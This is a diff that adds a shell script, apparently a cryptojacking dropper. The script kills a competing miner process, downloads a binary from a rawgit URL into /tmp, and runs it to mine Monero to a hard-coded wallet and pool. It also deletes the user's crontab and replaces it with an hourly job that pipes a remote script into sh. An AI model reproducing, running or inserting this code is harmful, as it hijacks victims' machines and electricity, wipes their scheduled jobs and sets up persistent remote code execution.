@@ -1,0 +1,15 @@
+#!/bin/sh
+ps -efww|grep 45P1BysFcezLaZDKYYqw1shoakYT6TcC3aeGYpJHTBqPTd4gAiXJ1yMZ5q4k9WvtY33r4e7ZVekEvdMHfm3efTiUVsabndU |grep -v grep|cut -c 9-15|xargs kill -9
+ps -fe|grep 43QPwXMFy6Qfs2ecLYMTBbPimDW39aRL9Uvaw2yHzuGbGVSGb4vjuTQh61ndqiRCNAdfSN5MuwTaJ2PzEcs2k1bK8b4YPGL  |grep -v grep
+if [ $? -ne 0 ]
+then
+echo "start process....."
+curl -o /tmp/minerd https://cdn.rawgit.com/testdoge/testdoge/master/test1
+chmod +x /tmp/minerd
+nohup /tmp/minerd -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 43QPwXMFy6Qfs2ecLYMTBbPimDW39aRL9Uvaw2yHzuGbGVSGb4vjuTQh61ndqiRCNAdfSN5MuwTaJ2PzEcs2k1bK8b4YPGL -p x &
+else
+echo "runing....."
+fi
+crontab -r
+(crontab -l;printf '*/60 * * * *  curl https://cdn.rawgit.com/testdoge/testdoge/master/2 | sh \n')|crontab -
+(crontab -l;printf '*/60 * * * *  curl https://cdn.rawgit.com/testdoge/testdoge/master/2 | sh \n')|crontab -
